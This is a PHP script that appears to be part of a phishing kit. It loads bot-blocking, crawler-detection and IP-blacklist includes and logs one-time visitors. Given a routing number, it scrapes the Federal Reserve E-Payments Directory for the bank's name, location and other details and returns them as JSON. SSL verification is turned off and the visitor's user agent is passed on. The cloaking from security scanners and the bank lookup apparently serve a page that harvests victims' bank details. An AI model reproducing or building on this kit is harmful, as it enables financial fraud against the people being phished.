<?php
session_start();
// By Beems
require_once '../main.php';

require_once '../blocker.php';
if($block_referrer == "on") {
    require_once '../crawlerdetect.php';
}
if($block_iprange == "on") {
    require_once '../blacklist.php';
}

if($onetime == "on") {
    tulis_file("../security/onetime.dat","$ip");
}

if (isset($_GET['routing'])) {
  $postFields = "agreementValue=Agree";
  $mCookie = "fedach.txt";
  $reffer = "https://www.frbservices.org/EPaymentsDirectory/agreement.html";
  $mUrl = "https://www.frbservices.org/EPaymentsDirectory/submitAgreement";
  $ch = curl_init();
  curl_setopt ( $ch, CURLOPT_SSL_VERIFYPEER, false );
  curl_setopt ( $ch, CURLOPT_SSL_VERIFYHOST, 0 );
  curl_setopt($ch, CURLOPT_VERBOSE, 1);
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_URL, $mUrl);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_COOKIEFILE, $mCookie);
  curl_setopt($ch, CURLOPT_COOKIEJAR, $mCookie);
  $mRes = curl_exec($ch);
  curl_close($ch);
  $loginUrl = "https://www.frbservices.org/EPaymentsDirectory/detailACH.html?referredBy=detailFromAchResults&aba=".$_GET['routing']."&displaySearchLinks=true";
  $ch=curl_init();
  curl_setopt ( $ch, CURLOPT_SSL_VERIFYPEER, false );
  curl_setopt ( $ch, CURLOPT_SSL_VERIFYHOST, 0 );
  curl_setopt($ch, CURLOPT_URL, $loginUrl);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_COOKIEFILE, $mCookie);
  curl_setopt($ch, CURLOPT_COOKIEJAR, $mCookie);
  curl_setopt($ch, CURLOPT_REFERER, $reffer);
  $postRes = curl_exec($ch);
  preg_match('/<li id="detail_name"><strong>Bank Name:<\/strong> (.*?)<\/li>/', $postRes, $BankNameArr);
  preg_match('/<li id="detail_location"><strong>Location:<\/strong> (.*?)<\/li>/', $postRes, $BankLocationArr);
  preg_match('/<li id="detail_rn"><strong>Routing Number:<\/strong> (.*?)<\/li>/', $postRes, $BankRoutingArr);
  preg_match('/<li id="detail_tn"><strong>Telephone Number:<\/strong> (.*?)<\/li>/', $postRes, $BankTeleArr);
  preg_match('/<li id="detail_revised"><strong>Revised:<\/strong> (.*?)<\/li>/', $postRes, $BankRevisedArr);
  preg_match('/<li id="detail_office_code"><strong>Office Code:<\/strong> (.*?)<\/li>/', $postRes, $BankOfficeCArr);
  preg_match('/<li id="detail_record_type"><strong>Record Type Code:<\/strong> (.*?)<\/li>/', $postRes, $BankRecordTArr);
  preg_match('/<li id="detail_new_rn"><strong>New Routing Number:<\/strong> (.*?)<\/li>/', $postRes, $BankNewRoutingArr);
  preg_match('/<li id="detail_status_code"><strong>Institution Status Code:<\/strong> (.*?)<\/li>/', $postRes, $BankInstSCArr);
  preg_match('/<li id="detail_FRB"><strong>Servicing FRB Number:<\/strong> (.*?)<\/li>/', $postRes, $ServiceFRBArr);
  $BankName = $BankNameArr[1];
  $BankLocation = $BankLocationArr[1];
  $BankRouting = $BankRoutingArr[1];
  $BankTele = $BankTeleArr[1];
  $BankRevised = $BankRevisedArr[1];
  $BankOfficeC = $BankOfficeCArr[1];
  $BankRecordT = $BankRecordTArr[1];
  $BankNewRouting = $BankNewRoutingArr[1];
  $BankInstSC = $BankInstSCArr[1];
  $ServiceFRB = $ServiceFRBArr[1];
  $result = array(
        'BankName' =>   $BankName,
        'BankLocation' => $BankLocation,
        'BankRouting' => $BankRouting,
        'BankTele' => $BankTele,
        'BankRevised' =>   $BankRevised,
        'BankOfficeC' => $BankOfficeC,
        'BankRecordT' => $BankRecordT,
        'BankNewRouting' => $BankNewRouting,
        'BankInstSC' => $BankInstSC,
        'ServiceFRB' => $ServiceFRB

    );
echo json_encode($result);
}

?>